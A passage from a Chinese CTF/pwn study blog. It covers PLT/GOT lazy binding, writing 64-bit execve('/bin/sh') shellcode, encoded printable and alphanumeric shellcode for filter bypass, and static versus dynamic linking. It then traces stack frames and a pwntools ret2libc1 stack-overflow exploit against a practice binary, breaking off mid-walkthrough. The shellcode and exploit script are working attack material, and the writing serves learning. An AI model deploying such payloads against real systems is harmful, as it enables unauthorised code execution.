函数的地址了</p><p>现在要做的是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   $<span class="number">0x0</span>    <span class="comment">//将数据压到栈上，作为将要执行的函数的参数</span></span><br><span class="line">jmp    <span class="number">0x80482d0</span>   <span class="comment">//去到了第一个表项</span></span><br></pre></td></tr></table></figure><p>接下来继续</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">080482</span>d0 &lt;common@plt&gt;:</span><br><span class="line">pushl  <span class="number">0x804a004</span>  <span class="comment">//将数据压到栈上，作为后面函数的参数</span></span><br><span class="line">jmp    *<span class="number">0x804a008</span> <span class="comment">//跳转到函数</span></span><br><span class="line">add    %al,(%eax)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0</p><p><img src="1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png" alt="img"></p><p>当执行后他有了值</p><p><img src="1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png" alt="img"></p><p>这个值对应的函数是 <code>_dl_runtime_resolve</code></p><p>那现在做一个小总结：</p><p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p><p>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</p><p>到这里我们还需要知道</p><ol><li>_dl_runtime_resolve 是怎么知道要查找 printf 函数的</li><li>_dl_runtime_resolve 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项</li></ol><p>第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的 id，告诉了 _dl_runtime_resolve 要去找哪一个函数的地址</p><p>在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息</p><p><img src="1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png" alt="img"></p><p>这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来</p><p>第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址</p><p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p><p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong> </p><p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong> </p><p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p><p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p><p><strong>跟着大佬的流程图来走一遍：</strong></p><p>第一次调用</p><p><img src="1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg" alt="img"></p><p>之后再次调用<img src="1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c-165011977946810.jpeg" alt="img"></p><br/><br/><br/><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="* shellcode"></a>* shellcode</h2><p>文章转自：<a href="https://nuoye-blog.github.io/2020/05/09/dea90f48/">64位shellcode编写 | nuoye’s blog (nuoye-blog.github.io)</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>目前网上主要是各种32位的shellcode编写教程，64位的比较少，这篇文章主要讲解一下64位shellcode的编写以及介绍几种比较常见的白名单绕过方法</p><h3 id="64位shellcode编写"><a href="#64位shellcode编写" class="headerlink" title="64位shellcode编写"></a>64位shellcode编写</h3><h4 id="直接pwntools生成默认shellcode"><a href="#直接pwntools生成默认shellcode" class="headerlink" title="直接pwntools生成默认shellcode"></a>直接pwntools生成默认shellcode</h4><p>这一种方法是最简单的，通过下面的代码即可生成一段64位shellcode代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p>但这段代码有一个缺点，就是生成的shellcode比较长，在某些空间比较小的情况不能很好的使用，接下来我们就一步一步的学习手动编写shellcode吧。</p><h4 id="手动编写shellcode"><a href="#手动编写shellcode" class="headerlink" title="手动编写shellcode"></a>手动编写shellcode</h4><p>在手动编写shellcode之前，我们首先要知道shellcode这一段代码调动shell的原理。</p><p>linux中，存在着一系列的系统调用，这些系统调用都通过syscall指令来触发，并且通过rax寄存器作为系统调用号来区分不同的系统调用，可以通过查看linux源码目录下的arch/x86/entry/syscall_64.tbl获得对应的系统调用号。比如，execve对应的的系统调用号为59。</p><p>接着，即是通过rdi和rsi两个寄存器传入参数。其中，rdi是指向运行程序的路径的指针，rsi为一个指向0的指针，rdx为0。</p><p>总结下，我们应该完成如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax = 59</span><br><span class="line">rdi = [&#x27;/bin/sh&#x27;]</span><br><span class="line">rsi = [0]</span><br><span class="line">rdx = 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>所以就可以编写我们就可以开始正式编写了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rdx,rdx</span><br><span class="line">push rdx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rax,0x68732f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rax,59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>(这里因为64位数据不能直接push，所以用了rax寄存器来传递)</p><p>编写完后，我们可以用pwntools模块来快速编译使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure><p>这样生成的shellcode就只有30字节，一般这种大小就足够了。</p><h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><h4 id="可打印ascii"><a href="#可打印ascii" class="headerlink" title="可打印ascii"></a>可打印ascii</h4><p>这一种的限制一般是要求shellcode为可打印字符，包括字母、数字、符号。</p><p>针对这一种白名单，已经有了一个不错的工具：<a href="https://github.com/rcx/shellcode_encoder">shellcode_encoder</a></p><p>使用这一工具首先需要安装z3-solver：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install z3-solver</span><br></pre></td></tr></table></figure><p>开始生成可打印shellcode前，我们需要先将原来的shellcode输出到一个文件中，这里我们用python来执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;shellcode&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">f.write(shellcode)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后，将生成的shellcode文件放到shellcode_encoder目录下，运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python main.py shellcode rax+29</span><br></pre></td></tr></table></figure><p>其中，shellcode是我们生成的shellcode文件，然后因为漏洞程序是通过call rax调用shellcode的，以及shellcode_encoder生成shellcode时的偏移位置，所以这里用了rax+29。</p><p>然后就会自动生成可打印的shellcode了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Original length: 30</span><br><span class="line">Encoded length:  476</span><br><span class="line">Preamble length: 29</span><br><span class="line">Total length:    505</span><br><span class="line"></span><br><span class="line">PPTAYAXVI31VXXXf-C_f-@hf-`8PZTAYAXVI31VXPP[_Hc4:14:SX- (mz-i Wx5?&lt;??P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-IL+N-@x6x5?41&#125;P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-Txl(-H0| 5V__&gt;P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-Gz#&#x27;-~  @5?_?_P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-e3&#x27;R-T)@~5O ^?P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-&amp;Pu8-( @@57O?oP^14:WX-|w_?-@U@C-@3`&#125;P_SX-:AXH-#?Hx5;~_?P_Hc4:14:SX- $80- ,  5?M7?P^14:WX-|w_?-@U@C-@3`&#125;P_SX-@dG1- dyo5&lt;6?_P^SX-zphB-``(~5&gt;/o?P_AAAAo&#123;5mTM=K8_?* *v k1jXk_DC(%r:ou&#125;&#125;n;oopM]alYoM0&quot;+/O%Y2P9@&quot;USR2|O?+</span><br></pre></td></tr></table></figure><p>可以看到shellcode的总长是505，这样的长度对于某些特定的题目来说是不行的，所以下面介绍另一种shellcode。</p><h4 id="纯数字字母shellcode"><a href="#纯数字字母shellcode" class="headerlink" title="纯数字字母shellcode"></a>纯数字字母shellcode</h4><p>文章：<a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129">https://hama.hatenadiary.jp/entry/2017/04/04/190129</a></p><p>这里就不具体分析了，直接给出最终的shellcode，感兴趣的可以自行阅读学习</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</span><br></pre></td></tr></table></figure><br/><br/><br/><h2 id="Dynamic-and-Static-Link"><a href="#Dynamic-and-Static-Link" class="headerlink" title="Dynamic and Static Link"></a>Dynamic and Static Link</h2><p>原文链接：<a href="https://lantern.cool/note-binary-dynamic-static-link/">Dynamic and Static Link | Lantern’s 小站</a></p><br/><br/><h3 id="库"><a href="#库" class="headerlink" title="库"></a>库</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;库是写好的现有的，成熟的，可以复用的代码。现实中每个程序都要依赖很多基础的底层库，不可能每个人的代码都从零开始，因此库的存在意义非同寻常。</p><p>本质上来说库是一种可执行代码的二进制形式，可以被操作系统载入内存执行。</p><p>库有两种：静态库（.a、.lib）和动态库（.so、.dll）。</p><p>windows 上对应的是.lib .dll linux 上对应的是.a .so</p><br/><br/><h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;源文件（.h, .cpp 等） =&gt; 预编译 =&gt; 编译 =&gt; 汇编 =&gt; 链接 =&gt; 可执行文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;而静态库、动态库区别来自<code>链接阶段</code>如何处理库从而链接成可执行文件，分别称为静态链接和动态链接</p><p><br/><br/></p><h3 id="静态库"><a href="#静态库" class="headerlink" title="静态库"></a>静态库</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;在链接阶段，会将汇编生成的目标文件.o 与引用到的库一起链接打包到可执行文件中。因此对应的链接方式称为静态链接。</p><p>特点:</p><ul><li>静态库对函数库的链接是在<code>编译阶段</code>完成的</li><li>程序在运行时与函数库再无关系，移植方便</li><li>浪费空间和资源，因为所有相关的目标文件与涉及到的函数库将被链接合成一个可执行文件</li></ul><p>问题:</p><ul><li>空间浪费：如果静态库再内存中存在多份拷贝，例如该静态库占用 1 内存，有 2000 个程序运用了该静态库，将占用将近 2GB 内存</li><li>对程序更新、部署和发布带来麻烦：如果静态库 liba.lib 更新将导致它的应用程序都需重新编译、发布给用户。对用户而言可能是一个很小的改动，却导致整个程序重新下载，全量更新</li></ul><p><br/><br/></p><h3 id="动态库"><a href="#动态库" class="headerlink" title="动态库"></a>动态库</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;动态库在程序编译时并不会被连接到目标代码中，而是在程序运行是才被载入。不同的应用程序如果调用相同的库，那么在内存里只需要有一份该共享库的实例，规避了空间浪费问题。动态库在程序运行是才被载入，也解决了静态库对程序的更新、部署和发布页会带来麻烦。用户只需要更新动态库即可，增量更新。</p><p>特点:</p><ul><li>动态库把对一些库函数的链接载入推迟到程序运行的时期</li><li>可以实现进程之间的资源共享（因此动态库也称为共享库）</li><li>程序升级变得简单</li><li>可以真正做到链接载入完全由程序员在程序代码中控制（显示调用）</li></ul><p>问题:</p><ul><li>“DLL 地狱”: 如果较新的版本不能正确地向后兼容，则不兼容的更新库将破坏依赖于库以前版本的可执行文件</li><li>程序及其使用的库可以作为软件包进行认证（例如，关于正确性，文档要求或性能）, 但是，如果可以更换组件，则不能。（这也反对在关键系统中自动进行操作系统更新；在两种情况下，操作系统和库均构成合格环境的一部分）</li></ul><br/><p>参考:</p><p><a href="https://www.zhihu.com/question/20484931">Linux 中的动态链接库和静态链接库是干什么的？</a></p><br/><br/><br/><p>链接：<a href="https://www.anquanke.com/post/id/183370">深入理解GOT表覆写技术 - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    <summary type="html">pwn</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>栈分析</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/04/13/%E6%A0%88%E5%88%86%E6%9E%90/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/04/13/%E6%A0%88%E5%88%86%E6%9E%90/</id>
    <published>2022-04-12T16:04:45.000Z</published>
    <updated>2022-04-17T01:01:54.294Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常规函数运行时栈况"><a href="#常规函数运行时栈况" class="headerlink" title="常规函数运行时栈况"></a>常规函数运行时栈况</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#源码</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">haha</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lala</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a,b,c;</span><br><span class="line">haha();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">haha</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">lala();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lala</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wawa&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><p>如下得到 hawala.out ，复制到 widows 中丢进 ida 进行反编译</p><p><img src="image-20220413140332809.png" alt="image-20220413140332809"></p><p>对于 $ gcc -o hawala.out hawala.c -m32  ，(gcc -o &lt;生成文件名&gt; &lt;所要编译的文件名&gt; -m32，其中-m32表示编译为32位文件)</p><p>以上得到的 hawala.out 复制到 windows 下，丢进32位ida得到反编译汇编码</p><p>main()函数：</p><p><img src="image-20220413095816044.png" alt="image-20220413095816044"></p><p>haha()函数：</p><p><img src="image-20220413100920439.png" alt="image-20220413100920439"></p><p>lala()函数：</p><p><img src="image-20220413100947928.png" alt="image-20220413100947928"></p><p>从上面三个函数我们可以看到普通函数的函数头与函数尾的汇编指令大致与下图无异</p><p><img src="image-20220413101030564.png" alt="image-20220413101030564"></p><h2 id="单看函数头与函数尾"><a href="#单看函数头与函数尾" class="headerlink" title="单看函数头与函数尾"></a>单看函数头与函数尾</h2><p>图1（初始栈况）：地址值均为假设，栈左边为栈地址，栈中间为栈上存储的数据，ebp、esp存储的值为栈地址，栈从高地址向低地址生长。十六进制，一个数字代表4位</p><p><img src="image-20220413104217132.png" alt="image-20220413104217132"></p><p>图2（函数头）：push  ebp  ，效果，esp下移，ebp寄存器的值入栈（下图中ebp存储的是栈地址0xffff0080）</p><p><img src="image-20220413104250916.png" alt="image-20220413104250916"></p><p>图3（函数头）：mov  ebp, esp  ，效果，esp值赋给ebp</p><p><img src="image-20220413104939500.png" alt="image-20220413104939500"></p><p>图4（函数头）：and  esp, 0FFFFFFF0h  (注意这是9位数，带7个F，其中h表示16进制），将esp与0xfffffff0进行按位与操作，好像是对齐操作，总之效果就是将esp的后四位置0，使esp指针向下移动，又由图2知此时esp寄存器值为0xffff0070，后四位为0，所以将它与0xfffffff0按位与后esp位置不变</p><p><img src="image-20220413105821968.png" alt="image-20220413105821968"></p><p>图5：假设函数中间的汇编使esp执行到了向下的任意位置，但ebp是不会变的</p><p><img src="image-20220413110344050.png" alt="image-20220413110344050"></p><p>图6（函数尾）：mov  esp， ebp  ，效果：ebp的值赋给esp，导致esp指向0xffff0070</p><p><img src="image-20220413110623204.png" alt="image-20220413110623204"></p><p>图7（函数尾）：pop  ebp   ，效果：取出esp指向的栈上的数据赋给ebp，esp再自增四个字节</p><p><img src="image-20220413111149492.png" alt="image-20220413111149492"></p><p>图8（函数尾）：pop  eip  ，效果：此时eip被赋值为0xffff0074地址处的值0x????????</p><p><img src="image-20220413111516961.png" alt="image-20220413111516961"></p><p>最后：  jmp  eip  ，效果：程序跳转到eip寄存器上的地址开始执行，这也是为什么说ebp的上一栈位置为ret指令的原因，通过栈溢出将system(“/bin/sh”)的地址覆盖到ebp指针的上一栈位置处，我们就能执行system函数拿到shell。</p><br/><p>上述过程没有列出函数中间部分的汇编指令对esp、ebp的影响，甚至中间有一些call指令，对于这里的call指令，它应该就是调用别的函数做一些必要操作，call函数调用过程中会改变ebp的值，但调用完后，ebp值又会恢复到调用call指令前的位置，所以可以视为在执行函数中间部分（非函数头、函数尾的部分）的前后，ebp寄存器的值不变</p><p><img src="image-20220413112154187.png" alt="image-20220413112154187"></p><br/><p>总结：若此文你是在博客中看到的，可以试试 ctrl+滚轮 放大观看</p><p><img src="image-20220413115522038.png" alt="image-20220413115522038"></p><br/><h2 id="以源码中的程序为例"><a href="#以源码中的程序为例" class="headerlink" title="以源码中的程序为例"></a>以源码中的程序为例</h2><p>请自行分析</p><br/><br/><h1 id="libc库函数调用时栈况-plt、got"><a href="#libc库函数调用时栈况-plt、got" class="headerlink" title="libc库函数调用时栈况(plt、got)"></a>libc库函数调用时栈况(plt、got)</h1><p>因为lala()函数中带有libc库函数printf（动态链接库，啥是动态链接？，自己想办法了解或者我的博客里去翻）</p><p><img src="image-20220413120044419.png" alt="image-20220413120044419"></p><p>所以我们就拿这个printf举例</p><h2 id="不跟进printf-plt，观察ebp、esp前后变化"><a href="#不跟进printf-plt，观察ebp、esp前后变化" class="headerlink" title="不跟进printf@plt，观察ebp、esp前后变化"></a>不跟进printf@plt，观察ebp、esp前后变化</h2><p>因为开启了地址随机化保护，所以我们就直接在lala()函数下断点，再ni单步执行到call printf</p><p><img src="image-20220413141235714.png" alt="image-20220413141235714"></p><p><img src="image-20220413141341649.png" alt="image-20220413141341649"></p><p>ok，马上就要进入到plt表中了，此时ebp指向0xffffd028（由下图可知0xffffd028上存的是0xffffd038，0xffffd038上存的是0xffffd048，担心你们不懂什么意思，我再补一张栈图），esp指向0xffffd010</p><p><img src="image-20220413141719535.png" alt="image-20220413141719535"></p><p><img src="image-20220413142706205.png" alt="image-20220413142706205"></p><p>其实上图也好理解，0xffffd048至0xffffd038是main()函数占用的栈空间，0xffffd038至0xffffd028是haha()函数占用的栈空间，剩下的就是目前lala()函数占用的栈空间，若lala()执行完，ebp从0xffffd028回退到0xffffd038，就相当于haha()中调用lala()，而lala()此时执行完毕要回到haha()函数，当然，若haha()也执行完毕，那么ebp就会回到0xffffd048，就相当于回到main()函数。</p><br/><p>好了，接下来我们用 x/130wx &lt;地址&gt; 打印栈上存储的信息进行查看，地址就填esp指向的栈地址0xffffd010，ok记录，继续ni执行</p><p><img src="image-20220413144048372.png" alt="image-20220413144048372"></p><p><img src="image-20220413144315964.png" alt="image-20220413144315964"></p><p>我们用 x/30wx 0xffffd010 打印看看，的确没变，好的，可以总结了</p><p><img src="image-20220413144430194.png" alt="image-20220413144430194"></p><p><strong>总结：</strong></p><p>调用libc库中未载入的 printf 函数的 plt 表后ebp、esp值与调用前无异，当然，调用普通函数也一样，因为有个词叫“保持栈平衡”，意思就是函数调用前后，esp 和 ebp 要保持一致，retn 其实除了 jmp eip ，还会做栈平衡操作。n代表参数个数，从而平衡函数调用的时候push 参数时 esp 的变化，具体深入的了解话，请自行探索。</p><br/><br/><h2 id="跟进printf-plt表"><a href="#跟进printf-plt表" class="headerlink" title="跟进printf@plt表"></a>跟进printf@plt表</h2><p>之前用的都是ni，单步不进入函数体执行，想要查看进入后是什么情况的话，我们在call printf那一句处使用 si 进行单步执行就行</p><p><img src="image-20220413145312729.png" alt="image-20220413145312729"></p><p><img src="image-20220413145430209.png" alt="image-20220413145430209"></p><p>之后便是plt、got表相关的知识了，探索暂时中止，plt与got表我也是一知半解，只知道表层原理描述，深层具体的运行实现并不是很懂</p><br/><br/><h1 id="实战-下面的不用看，浪费时间，失败的例子"><a href="#实战-下面的不用看，浪费时间，失败的例子" class="headerlink" title="实战(下面的不用看，浪费时间，失败的例子)"></a>实战(下面的不用看，浪费时间，失败的例子)</h1><h2 id="例1：ret2libc1"><a href="#例1：ret2libc1" class="headerlink" title="例1：ret2libc1"></a>例1：ret2libc1</h2><p>链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp中的payload</span></span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1、首先我们 gdb调试 ret2libc1 ，运行到gets函数，记录ebp、esp值</p><p><img src="image-20220415142106997.png" alt="image-20220415142106997"></p><p>2、单步ni指令后输入200个a字符，记录ebp、esp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#开启新终端，打开python，输入print(200*&#x27;a&#x27;)，回车</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p><img src="image-20220415143032501.png" alt="image-20220415143032501"></p><p>3、 x/130wx 0xffffcf40 从esp开始向高地址打印130组信息（32位一组），由此我们画出栈布局（以下第二张图）</p><p><img src="image-20220415143601874.png" alt="image-20220415143601874"></p><p>对了，0x61即16进制的61，转成十进制就是97，即字符a的ascll码值（大佬绕道）</p><p><img src="image-20220415144213653.png" alt="image-20220415144213653"></p><p>4、好了，刚刚输入的是200个a，现在重新来一遍，写个脚本把payload输进去，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x08048720</span>        <span class="comment">#/bin/sh字符串地址</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span>        <span class="comment">#plt表中system位置</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt,<span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">&quot;b *0x08048683&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#以下用#号注释掉的方法我的Ubuntu用了会报错</span></span><br><span class="line"><span class="comment">#链接：https://blog.csdn.net/fjh1997/article/details/105434992</span></span><br><span class="line"><span class="comment">#binsh_addr = 0x8048720    </span></span><br><span class="line"><span class="comment">#system_plt = 0x08048460</span></span><br><span class="line"><span class="comment">#payload = flat([b&#x27;a&#x27; * 112, system_plt,b&#x27;b&#x27; * 4, binsh_addr])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=gdb.debug(&quot;ret2libc1&quot;,&quot;break main&quot;)</span></span><br><span class="line"><span class="comment">#sh.sendline(payload)</span></span><br><span class="line"><span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vim 写好脚本，python3执行</p><p><img src="image-20220415171704527.png" alt="image-20220415171704527"></p><p>执行后会弹出一个终端，输入c ，即continue</p><p><img src="image-20220415171824574.png" alt="image-20220415171824574"></p><p>可以看到已经有aaaa写入了</p><p><img src="image-20220415171926168.png" alt="image-20220415171926168"></p><p>x/130wx 0xffd13110，可以看到ebp往上一个高地址已经被覆盖成了我们的一个目标地址</p><p><img src="image-20220415172146813.png" alt="image-20220415172146813"></p><p>画一下现在的栈情况：（对了，再提一次，ebp上面的栈上数据会被ret调用）</p><p><img 